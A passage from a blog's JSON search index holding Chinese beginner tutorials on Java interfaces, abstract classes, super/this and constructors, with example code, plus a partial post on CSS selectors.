&#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java继承父类并实现多个接口","slug":"java00101继承父类并实现多个接口","date":"2020-03-10T12:49:17.000Z","updated":"2020-03-10T13:23:12.241Z","comments":true,"path":"2020/03/10/java00101继承父类并实现多个接口/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00101继承父类并实现多个接口/","excerpt":"","text":"java继承父类并实现多个接口 使用接口的时候，需要注意： 接口是没有静态代码块或者构造方法的。 12345678910111213141516package cn.itcast.day10.demo02;public interface MyInterfaceA &#123; // 错误写法！接口不能有静态代码块// static &#123;//// &#125; // 错误写法！接口不能有构造方法// public MyInterfaceA() &#123;//// &#125;&#125; 一个类的直接父类是唯一的，但是一个类可以同时实现多个接口。 格式： 123public class MyInterfaceImpl implements MyInterfaceA, MyInterfaceB &#123; // 覆盖重写所有抽象方法&#125; 如果实现类所实现的多个接口当中，存在重复的抽象方法，那么只需要覆盖重写一次即可。 1234567891011121314151617181920package cn.itcast.day10.demo02;public abstract class MyInterfaceAbstract implements MyInterfaceA, MyInterfaceB &#123; @Override public void methodA() &#123; &#125; //只需要覆盖重写一次 @Override public void methodAbs() &#123; &#125; @Override public void methodDefault() &#123; &#125;&#125; 1234567891011121314package cn.itcast.day10.demo02;public interface MyInterfaceB &#123; public abstract void methodB(); public abstract void methodAbs(); public default void methodDefault() &#123; System.out.println(\"默认方法BBB\"); &#125;&#125; 1234567891011121314package cn.itcast.day10.demo02;public interface MyInterfaceA &#123; public abstract void methodA(); public abstract void methodAbs(); public default void methodDefault() &#123; System.out.println(\"默认方法AAA\"); &#125;&#125; 如果实现类没有覆盖重写所有接口当中的所有抽象方法，那么实现类就必须是一个抽象类。 12345package cn.itcast.day10.demo02;public abstract class MyInterfaceAbstract implements MyInterfaceA, MyInterfaceB &#123; //不重写抽象方法&#125; 如果实现类锁实现的多个接口当中，存在重复的默认方法，那么实现类一定要对冲突的默认方法进行覆盖重写。 12345678910package cn.itcast.day10.demo02;public interface MyInterfaceA &#123; public default void methodDefault() &#123; System.out.println(\"默认方法AAA\"); &#125;&#125; 12345678910package cn.itcast.day10.demo02;public interface MyInterfaceB &#123; public default void methodDefault() &#123; System.out.println(\"默认方法BBB\"); &#125;&#125; 1234567891011package cn.itcast.day10.demo02;public abstract class MyInterfaceAbstract implements MyInterfaceA, MyInterfaceB &#123; //重写默认方法 @Override public void methodDefault() &#123; &#125;&#125; 一个类如果直接父类当中的方法，和接口当中的默认方法产生了冲突，优先用父类当中的方法。 123456789package cn.itcast.day10.demo02;public interface MyInterface &#123; public default void method() &#123; System.out.println(\"接口的默认方法\"); &#125;&#125; 123456789package cn.itcast.day10.demo02;public class Fu &#123; public void method() &#123; System.out.println(\"父类方法\"); &#125;&#125; 1234package cn.itcast.day10.demo02;public class Zi extends Fu implements MyInterface &#123;&#125; 123456789101112package cn.itcast.day10.demo02;public class Demo01Interface &#123; public static void main(String[] args) &#123; Zi zi = new Zi(); //这里调用的是父类的method方法 zi.method(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的内容小结","slug":"java00100接口的内容小结","date":"2020-03-10T08:15:18.000Z","updated":"2020-03-10T09:38:56.219Z","comments":true,"path":"2020/03/10/java00100接口的内容小结/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00100接口的内容小结/","excerpt":"","text":"java接口的内容小结","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的常量定义和使用","slug":"java00099接口的常量定义和使用","date":"2020-03-10T08:10:04.000Z","updated":"2020-03-10T09:38:15.569Z","comments":true,"path":"2020/03/10/java00099接口的常量定义和使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00099接口的常量定义和使用/","excerpt":"","text":"java接口的常量定义和使用 接口当中也可以定义“成员变量”，但是必须使用public static final三个关键字进行修饰。 从效果上看，这其实就是接口的【常量】。 格式： public static final 数据类型 常量名称 = 数据值; 备注： 一旦使用final关键字进行修饰，说明不可改变。 使用接口常量格式: 接口名.常量名 注意事项： 接口当中的常量，可以省略public static final，注意：不写也照样是这样。 接口当中的常量，必须进行赋值；不能不赋值。 接口中常量的名称，使用完全大写的字母，用下划线进行分隔。（推荐命名规则） 12345678package cn.itcast.day10.demo01;public interface MyInterfaceConst &#123; // 这其实就是一个常量，一旦赋值，不可以修改 public static final int NUM_OF_MY_CLASS = 12;&#125; 1234567891011package cn.itcast.day10.demo01;public class Demo05Interface &#123; public static void main(String[] args) &#123; // 访问接口当中的常量 System.out.println(MyInterfaceConst.NUM_OF_MY_CLASS); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的私有方法使用","slug":"java00098接口的私有方法使用","date":"2020-03-10T08:00:22.000Z","updated":"2020-03-10T09:34:40.434Z","comments":true,"path":"2020/03/10/java00098接口的私有方法使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00098接口的私有方法使用/","excerpt":"","text":"java接口的私有方法使用 12345678910package cn.itcast.day10.demo01;public class MyInterfacePrivateAImpl implements MyInterfacePrivateA &#123; public void methodAnother() &#123; // 直接访问到了接口中的默认方法，这样是错误的！// methodCommon(); &#125;&#125; 123456789101112131415161718192021package cn.itcast.day10.demo01;public interface MyInterfacePrivateB &#123; public static void methodStatic1() &#123; System.out.println(\"静态方法1\"); methodStaticCommon(); &#125; public static void methodStatic2() &#123; System.out.println(\"静态方法2\"); methodStaticCommon(); &#125; private static void methodStaticCommon() &#123; System.out.println(\"AAA\"); System.out.println(\"BBB\"); System.out.println(\"CCC\"); &#125;&#125; 123456789101112package cn.itcast.day10.demo01;public class Demo04Interface &#123; public static void main(String[] args) &#123; MyInterfacePrivateB.methodStatic1(); MyInterfacePrivateB.methodStatic2(); // 错误写法！// MyInterfacePrivateB.methodStaticCommon(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的私有方法定义","slug":"java00097接口的私有方法定义","date":"2020-03-10T07:47:52.000Z","updated":"2020-03-10T09:33:17.716Z","comments":true,"path":"2020/03/10/java00097接口的私有方法定义/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00097接口的私有方法定义/","excerpt":"","text":"java接口的私有方法定义 问题描述： 我们需要抽取一个共有方法，用来解决两个默认方法之间重复代码的问题。 但是这个共有方法不应该让实现类使用，应该是私有化的。 解决方案： 从Java 9开始，接口当中允许定义私有方法。 普通私有方法，解决多个默认方法之间重复代码问题 格式： 123private 返回值类型 方法名称(参数列表) &#123; 方法体&#125; 静态私有方法，解决多个静态方法之间重复代码问题 格式： 123private static 返回值类型 方法名称(参数列表) &#123; 方法体&#125; 123456789101112131415161718192021package cn.itcast.day10.demo01;public interface MyInterfacePrivateA &#123; public default void methodDefault1() &#123; System.out.println(\"默认方法1\"); methodCommon(); &#125; public default void methodDefault2() &#123; System.out.println(\"默认方法2\"); methodCommon(); &#125; private void methodCommon() &#123; System.out.println(\"AAA\"); System.out.println(\"BBB\"); System.out.println(\"CCC\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的静态方法使用","slug":"java00096接口的静态方法使用","date":"2020-03-10T07:44:40.000Z","updated":"2020-03-10T09:28:23.701Z","comments":true,"path":"2020/03/10/java00096接口的静态方法使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00096接口的静态方法使用/","excerpt":"","text":"java接口的静态方法使用 注意事项： 不能通过接口实现类的对象来调用接口当中的静态方法。 正确用法： 通过接口名称，直接调用其中的静态方法。 格式： 接口名称.静态方法名(参数); 1234package cn.itcast.day10.demo01;public class MyInterfaceStaticImpl implements MyInterfaceStatic &#123;&#125; 1234567891011121314151617package cn.itcast.day10.demo01;public class Demo03Interface &#123; public static void main(String[] args) &#123; // 创建了实现类对象 MyInterfaceStaticImpl impl = new MyInterfaceStaticImpl(); // 错误写法！// impl.methodStatic(); // 直接通过接口名称调用静态方法 MyInterfaceStatic.methodStatic(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的静态方法定义","slug":"java00095接口的静态方法定义","date":"2020-03-10T07:42:39.000Z","updated":"2020-03-10T09:26:13.981Z","comments":true,"path":"2020/03/10/java00095接口的静态方法定义/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00095接口的静态方法定义/","excerpt":"","text":"java接口的静态方法定义 从Java 8开始，接口当中允许定义静态方法。 格式： 123public static 返回值类型 方法名称(参数列表) &#123; 方法体&#125; 提示：就是将abstract或者default换成static即可，带上方法体。 123456789package cn.itcast.day10.demo01;public interface MyInterfaceStatic &#123; public static void methodStatic() &#123; System.out.println(\"这是接口的静态方法！\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的默认方法使用","slug":"java00094接口的默认方法使用","date":"2020-03-10T07:42:07.000Z","updated":"2020-03-10T09:22:41.199Z","comments":true,"path":"2020/03/10/java00094接口的默认方法使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00094接口的默认方法使用/","excerpt":"","text":"java接口的默认方法使用 接口的默认方法，可以通过接口实现类对象，直接调用。 接口的默认方法，也可以被接口实现类进行覆盖重写。 12345678910111213package cn.itcast.day10.demo01;public class MyInterfaceDefaultB implements MyInterfaceDefault &#123; @Override public void methodAbs() &#123; System.out.println(\"实现了抽象方法，BBB\"); &#125; @Override public void methodDefault() &#123; System.out.println(\"实现类B覆盖重写了接口的默认方法\"); &#125;&#125; 12345678package cn.itcast.day10.demo01;public class MyInterfaceDefaultA implements MyInterfaceDefault &#123; @Override public void methodAbs() &#123; System.out.println(\"实现了抽象方法，AAA\"); &#125;&#125; 12345678910111213141516171819202122232425package cn.itcast.day10.demo01;/*从Java 8开始，接口里允许定义默认方法。格式：public default 返回值类型 方法名称(参数列表) &#123; 方法体&#125;备注：接口当中的默认方法，可以解决接口升级的问题。 */public interface MyInterfaceDefault &#123; // 抽象方法 public abstract void methodAbs(); // 新添加了一个抽象方法// public abstract void methodAbs2(); // 新添加的方法，改成默认方法 public default void methodDefault() &#123; System.out.println(\"这是新添加的默认方法\"); &#125;&#125; 12345678910111213141516171819package cn.itcast.day10.demo01;public class Demo02Interface &#123; public static void main(String[] args) &#123; // 创建了实现类对象 MyInterfaceDefaultA a = new MyInterfaceDefaultA(); a.methodAbs(); // 调用抽象方法，实际运行的是右侧实现类。 // 调用默认方法，如果实现类当中没有，会向上找接口 a.methodDefault(); // 这是新添加的默认方法 System.out.println(\"==========\"); MyInterfaceDefaultB b = new MyInterfaceDefaultB(); b.methodAbs(); b.methodDefault(); // 实现类B覆盖重写了接口的默认方法 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的默认方法定义","slug":"java00093接口的默认方法定义","date":"2020-03-10T07:31:05.000Z","updated":"2020-03-10T09:18:22.169Z","comments":true,"path":"2020/03/10/java00093接口的默认方法定义/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00093接口的默认方法定义/","excerpt":"","text":"java接口的默认方法定义 从Java 8开始，接口里允许定义默认方法。 格式： 123public default 返回值类型 方法名称(参数列表) &#123; 方法体&#125; 备注：接口当中的默认方法，可以解决接口升级的问题。 1234567891011121314151617package cn.itcast.day10.demo01;public interface MyInterfaceDefault &#123; // 抽象方法 public abstract void methodAbs(); // 新添加了一个抽象方法// public abstract void methodAbs2(); // 新添加的方法，改成默认方法 public default void methodDefault() &#123; System.out.println(\"这是新添加的默认方法\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的抽象方法使用","slug":"java00092接口的抽象方法使用","date":"2020-03-10T07:23:09.000Z","updated":"2020-03-10T09:39:27.098Z","comments":true,"path":"2020/03/10/java00092接口的抽象方法使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00092接口的抽象方法使用/","excerpt":"","text":"java接口的抽象方法使用 123456789101112131415161718192021222324252627package cn.itcast.day10.demo01;/*在任何版本的Java中，接口都能定义抽象方法。格式：public abstract 返回值类型 方法名称(参数列表);注意事项：1. 接口当中的抽象方法，修饰符必须是两个固定的关键字：public abstract2. 这两个关键字修饰符，可以选择性地省略。（今天刚学，所以不推荐。）3. 方法的三要素，可以随意定义。 */public interface MyInterfaceAbstract &#123; // 这是一个抽象方法 public abstract void methodAbs1(); // 这也是抽象方法 abstract void methodAbs2(); // 这也是抽象方法 public void methodAbs3(); // 这也是抽象方法 void methodAbs4();&#125; 1234567891011121314151617181920212223package cn.itcast.day10.demo01;public class MyInterfaceAbstractImpl implements MyInterfaceAbstract &#123; @Override public void methodAbs1() &#123; System.out.println(\"这是第一个方法！\"); &#125; @Override public void methodAbs2() &#123; System.out.println(\"这是第二个方法！\"); &#125; @Override public void methodAbs3() &#123; System.out.println(\"这是第三个方法！\"); &#125; @Override public void methodAbs4() &#123; System.out.println(\"这是第四个方法！\"); &#125;&#125; 1234567891011121314package cn.itcast.day10.demo01;public class Demo01Interface &#123; public static void main(String[] args) &#123; // 错误写法！不能直接new接口对象使用。// MyInterfaceAbstract inter = new MyInterfaceAbstract(); // 创建实现类的对象使用 MyInterfaceAbstractImpl impl = new MyInterfaceAbstractImpl(); impl.methodAbs1(); impl.methodAbs2(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的抽象方法定义","slug":"java00091接口的抽象方法定义","date":"2020-03-10T07:18:29.000Z","updated":"2020-03-10T09:07:33.695Z","comments":true,"path":"2020/03/10/java00091接口的抽象方法定义/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00091接口的抽象方法定义/","excerpt":"","text":"java接口的抽象方法定义 在任何版本的Java中，接口都能定义抽象方法。 格式： public abstract 返回值类型 方法名称(参数列表); 注意事项： 接口当中的抽象方法，修饰符必须是两个固定的关键字：public abstract 这两个关键字修饰符，可以选择性地省略。 方法的三要素，可以随意定义。 123456789101112131415161718package cn.itcast.day10.demo01;public interface MyInterfaceAbstract &#123; // 这是一个抽象方法 public abstract void methodAbs1(); // 这也是抽象方法 abstract void methodAbs2(); // 这也是抽象方法 public void methodAbs3(); // 这也是抽象方法 void methodAbs4();&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的定义基本格式","slug":"java00090接口的定义基本格式","date":"2020-03-10T07:17:37.000Z","updated":"2020-03-10T09:04:55.060Z","comments":true,"path":"2020/03/10/java00090接口的定义基本格式/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00090接口的定义基本格式/","excerpt":"","text":"java接口的定义基本格式 接口就是多个类的公共规范。 接口是一种引用数据类型，最重要的内容就是其中的：抽象方法。 如何定义一个接口的格式： 123public interface 接口名称 &#123; // 接口内容&#125; 备注：换成了关键字interface之后，编译生成的字节码文件仍然是：.java --&gt; .class。 如果是Java 7，那么接口中可以包含的内容有： 常量 抽象方法 如果是Java 8，还可以额外包含有： 默认方法 静态方法 如果是Java 9，还可以额外包含有： 私有方法 接口使用步骤： 接口不能直接使用，必须有一个“实现类”来“实现”该接口。 格式： 123public class 实现类名称 implements 接口名称 &#123; // ...&#125; 接口的实现类必须覆盖重写（实现）接口中所有的抽象方法。 实现：去掉abstract关键字，加上方法体大括号。 创建实现类的对象，进行使用。 注意事项： 如果实现类并没有覆盖重写接口中所有的抽象方法，那么这个实现类自己就必须是抽象类。","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口概述与生活举例","slug":"java00089接口概述与生活举例","date":"2020-03-10T07:14:15.000Z","updated":"2020-03-10T08:17:19.335Z","comments":true,"path":"2020/03/10/java00089接口概述与生活举例/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00089接口概述与生活举例/","excerpt":"","text":"java接口概述与生活举例","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java抽象方法和抽象类的注意事项","slug":"java00088抽象方法和抽象类的注意事项","date":"2020-03-09T09:34:14.000Z","updated":"2020-03-09T11:17:06.579Z","comments":true,"path":"2020/03/09/java00088抽象方法和抽象类的注意事项/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/09/java00088抽象方法和抽象类的注意事项/","excerpt":"","text":"java抽象方法和抽象类的注意事项 12345678910package cn.itcast.day09.demo12;public class DemoMain &#123; public static void main(String[] args) &#123; Zi zi = new Zi(); zi.eat(); &#125;&#125; 12345678910package cn.itcast.day09.demo12;/*一个抽象类不一定含有抽象方法，只要保证抽象方法所在的类是抽象类，即可。这样没有抽象方法的抽象类，也不能直接创建对象，在一些特殊场景下有用途。 */public abstract class MyAbstract &#123;&#125; 1234567891011package cn.itcast.day09.demo12;public abstract class Fu &#123; public Fu() &#123; System.out.println(\"抽象父类构造方法执行！\"); &#125; public abstract void eat();&#125; 1234567891011121314package cn.itcast.day09.demo12;public class Zi extends Fu &#123; public Zi() &#123; // super(); System.out.println(\"子类构造方法执行\"); &#125; @Override public void eat() &#123; System.out.println(\"吃饭饭\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java抽象方法和抽象类的使用","slug":"java00087抽象方法和抽象类的使用","date":"2020-03-09T09:24:02.000Z","updated":"2020-03-09T11:13:02.607Z","comments":true,"path":"2020/03/09/java00087抽象方法和抽象类的使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/09/java00087抽象方法和抽象类的使用/","excerpt":"","text":"java抽象方法和抽象类的使用 抽象方法：就是加上abstract关键字，然后去掉大括号，直接分号结束。 抽象类：抽象方法所在的类，必须是抽象类才行。在class之前写上abstract即可。 如何使用抽象类和抽象方法： 不能直接创建new抽象类对象。 必须用一个子类来继承抽象父类。 子类必须覆盖重写抽象父类当中所有的抽象方法。 覆盖重写（实现）：子类去掉抽象方法的abstract关键字，然后补上方法体大括号。 创建子类对象进行使用。 12345678910111213package cn.itcast.day09.demo11;public abstract class Animal &#123; // 这是一个抽象方法，代表吃东西，但是具体吃什么（大括号的内容）不确定。 public abstract void eat(); // 这是普通的成员方法// public void normalMethod() &#123;//// &#125;&#125; 12345678910package cn.itcast.day09.demo11;public class Cat extends Animal &#123; @Override public void eat() &#123; System.out.println(\"猫吃鱼\"); &#125;&#125; 123456789101112package cn.itcast.day09.demo11;public class DemoMain &#123; public static void main(String[] args) &#123;// Animal animal = new Animal(); // 错误写法！不能直接创建抽象类对象 Cat cat = new Cat(); cat.eat(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java抽象方法和抽象类的定义格式","slug":"java00086抽象方法和抽象类的定义格式","date":"2020-03-09T09:17:55.000Z","updated":"2020-03-09T11:12:22.050Z","comments":true,"path":"2020/03/09/java00086抽象方法和抽象类的定义格式/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/09/java00086抽象方法和抽象类的定义格式/","excerpt":"","text":"java抽象方法和抽象类的定义格式 抽象方法：就是加上abstract关键字，然后去掉大括号，直接分号结束。 抽象类：抽象方法所在的类，必须是抽象类才行。在class之前写上abstract即可。 如何使用抽象类和抽象方法： 不能直接创建new抽象类对象。 必须用一个子类来继承抽象父类。 子类必须覆盖重写抽象父类当中所有的抽象方法。 覆盖重写（实现）：子类去掉抽象方法的abstract关键字，然后补上方法体大括号。 创建子类对象进行使用。 12345678910111213package cn.itcast.day09.demo11;public abstract class Animal &#123; // 这是一个抽象方法，代表吃东西，但是具体吃什么（大括号的内容）不确定。 public abstract void eat(); // 这是普通的成员方法// public void normalMethod() &#123;//// &#125;&#125; 12345678910package cn.itcast.day09.demo11;public class Cat extends Animal &#123; @Override public void eat() &#123; System.out.println(\"猫吃鱼\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java抽象的概念","slug":"java00085抽象的概念","date":"2020-03-09T09:14:57.000Z","updated":"2020-03-09T11:11:49.970Z","comments":true,"path":"2020/03/09/java00085抽象的概念/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/09/java00085抽象的概念/","excerpt":"","text":"java抽象的概念","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java继承的三个特点","slug":"java00084继承的三个特点","date":"2020-03-09T09:12:11.000Z","updated":"2020-03-09T10:53:28.821Z","comments":true,"path":"2020/03/09/java00084继承的三个特点/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/09/java00084继承的三个特点/","excerpt":"","text":"java继承的三个特点","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"super与this关键字的图解","slug":"java00083super与this关键字的图解","date":"2020-03-09T09:11:29.000Z","updated":"2020-03-09T10:49:27.402Z","comments":true,"path":"2020/03/09/java00083super与this关键字的图解/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/09/java00083super与this关键字的图解/","excerpt":"","text":"super与this关键字的图解 123456789101112package cn.itcast.day09.demo10;public class Demo &#123; public static void main(String[] args) &#123; Zi zi = new Zi(); zi.show(); zi.method(); &#125;&#125; 1234567891011package cn.itcast.day09.demo10;public class Fu &#123; int num = 10; public void method() &#123; System.out.println(\"父类方法\"); &#125;&#125; 1234567891011121314151617181920package cn.itcast.day09.demo10;public class Zi extends Fu &#123; int num = 20; @Override public void method() &#123; super.method(); // 调用了父类方法 System.out.println(\"子类方法\"); &#125; public void show() &#123; int num = 30; System.out.println(num); // 30 System.out.println(this.num); // 20 System.out.println(super.num); // 10 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"this关键字的三种用法","slug":"java00082this关键字的三种用法","date":"2020-03-09T09:10:59.000Z","updated":"2020-03-09T10:45:05.595Z","comments":true,"path":"2020/03/09/java00082this关键字的三种用法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/09/java00082this关键字的三种用法/","excerpt":"","text":"this关键字的三种用法 super关键字用来访问父类内容，而this关键字用来访问本类内容。用法也有三种： 在本类的成员方法中，访问本类的成员变量。 在本类的成员方法中，访问本类的另一个成员方法。 在本类的构造方法中，访问本类的另一个构造方法。 在第三种用法当中要注意： A. this(…)调用也必须是构造方法的第一个语句，唯一一个。 B. super和this两种构造调用，不能同时使用。 1234567package cn.itcast.day09.demo09;public class Fu &#123; int num = 30;&#125; 12345678910111213141516171819202122232425262728293031323334353637package cn.itcast.day09.demo09;public class Zi extends Fu &#123; int num = 20; public Zi() &#123;// super(); // 这一行不再赠送 this(123); // 本类的无参构造，调用本类的有参构造// this(1, 2); // 错误写法！ &#125; public Zi(int n) &#123; this(1, 2); &#125; public Zi(int n, int m) &#123; &#125; public void showNum() &#123; int num = 10; System.out.println(num); // 局部变量 System.out.println(this.num); // 本类中的成员变量 System.out.println(super.num); // 父类中的成员变量 &#125; public void methodA() &#123; System.out.println(\"AAA\"); &#125; public void methodB() &#123; this.methodA(); System.out.println(\"BBB\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"super关键字的三种用法","slug":"java00081super关键字的三种用法","date":"2020-03-09T09:10:33.000Z","updated":"2020-03-09T10:40:59.175Z","comments":true,"path":"2020/03/09/java00081super关键字的三种用法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/09/java00081super关键字的三种用法/","excerpt":"","text":"super关键字的三种用法 super关键字的用法有三种： 在子类的成员方法中，访问父类的成员变量。 在子类的成员方法中，访问父类的成员方法。 在子类的构造方法中，访问父类的构造方法。 1234567891011package cn.itcast.day09.demo08;public class Fu &#123; int num = 10; public void method() &#123; System.out.println(\"父类方法\"); &#125;&#125; 123456789101112131415161718192021package cn.itcast.day09.demo08;public class Zi extends Fu &#123; int num = 20; public Zi() &#123; super(); &#125; public void methodZi() &#123; System.out.println(super.num); // 父类中的num &#125; public void method() &#123; super.method(); // 访问父类中的method System.out.println(\"子类方法\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"继承中构造方法的访问特点","slug":"java00080继承中构造方法的访问特点","date":"2020-03-09T08:32:49.000Z","updated":"2020-03-09T08:40:02.049Z","comments":true,"path":"2020/03/09/java00080继承中构造方法的访问特点/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/09/java00080继承中构造方法的访问特点/","excerpt":"","text":"继承中构造方法的访问特点 继承关系中，父子类构造方法的访问特点： 子类构造方法当中有一个默认隐含的“super()”调用，所以一定是先调用的父类构造，后执行的子类构造。 子类构造可以通过super关键字来调用父类重载构造。 super的父类构造调用，必须是子类构造方法的第一个语句。不能一个子类构造调用多次super构造。 总结： 子类必须调用父类构造方法，不写则赠送super()；写了则用写的指定的super调用，super只能有一个，还必须是第一个。 1234567public class Demo01Constructor &#123; public static void main(String[] args) &#123; Zi zi = new Zi(); &#125;&#125; 12345678910111213package cn.itcast.day09.demo07;public class Fu &#123; public Fu() &#123; System.out.println(\"父类无参构造\"); &#125; public Fu(int num) &#123; System.out.println(\"父类有参构造！\"); &#125;&#125; 123456789101112131415package cn.itcast.day09.demo07;public class Zi extends Fu &#123; public Zi() &#123; super(); // 在调用父类无参构造方法// super(20); // 在调用父类重载的构造方法 System.out.println(\"子类构造方法！\"); &#125; public void method() &#123;// super(); // 错误写法！只有子类构造方法，才能调用父类构造方法。 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"常用选择器","slug":"html-css00018常用选择器","date":"2020-03-07T14:29:08.000Z","updated":"2020-05-29T23:05:20.938Z","comments":true,"path":"2020/03/07/html-css00018常用选择器/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/07/html-css00018常用选择器/","excerpt":"","text":"常用选择器 元素选择器 作用：根据标签名来选中指定的元素 语法：标签名{} 例子：p{} h1{} div{} 1234567 p&#123;color: red;&#125;h1&#123;color: green;&#125; id选择器 作用：根据元素的id属性值选中一个元素 语法：#id属性值{} 调用:id=&quot;属性值&quot; 例子：#box{} #red{} 123#red&#123;color: red;&#125; 类选择器 作用：根据元素的class属性值选中一组元素 id是唯一性的,所以只能应用到一个元素上 语法：.class属性值 调用: class=&quot;属性值1 [属性值2 属性值n]&quot; 1234567 .blue&#123;color: blue;&#125;.abc&#123;font-size: 20px;&#125; 复合选择器(并集选择器) 语法: 选择器1,选择器2,选择器n{} 123.class,h1,#a&#123;background-color: red;&#125; 复合选择器(交集选择器) 作用:可以选中同时满足多个选择器的元素 语法: 选择器1选择器2选择器N{} 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt; &lt;/title&gt; &lt;style type=\"text/css\"&gt; span.p3&#123; background-color:red; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;span class=\"p3\"&gt;I love you!&lt;/span&gt; &lt;/body&gt;&lt;/html&gt; 通配选择器 作用：选中页面中的所有元素 语法: *{} 123*&#123;color: red;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; /* 将所有的段落设置为红色（字体） 元素选择器 作用：根据标签名来选中指定的元素 语法：标签名&#123;&#125; 例子：p&#123;&#125; h1&#123;&#125; div&#123;&#125; */ /* p&#123; color: red; &#125; h1&#123; color: green; &#125; */ /* 将儿童相见不相识设置红色 id选择器 作用：根据元素的id属性值选中一个元素 语法：#id属性值&#123;&#125; 例子：#box&#123;&#125; #red&#123;&#125; */ /* #red&#123; color: red; &#125; */ /* 将 秋水... 和 落霞... 设置为蓝色 类选择器 作用：根据元素的class属性值选中一组元素 语法：.class属性值 */ /* .blue&#123; color: blue; &#125; .abc&#123; font-size: 20px; &#125; */ /* 通配选择器 作用：选中页面中的所有元素 语法: * */ *&#123; color: red; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h1 class=\"blue abc\"&gt;我是标题&lt;/h1&gt; &lt;p&gt;少小离家老大回&lt;/p&gt; &lt;p&gt;乡音无改鬓毛衰&lt;/p&gt; &lt;p id=\"red\"&gt;儿童相见不相识&lt;/p&gt; &lt;p&gt;笑问客从何处来&lt;/p&gt; &lt;!-- class 是一个标签的属性，它和id类似，不同的是class可以重复使用 可以通过class属性来为元素分组 可以同时为一个元素指定多个class属性 --&gt; &lt;p class=\"blue\"&gt;秋水共长天一色&lt;/p&gt; &lt;p 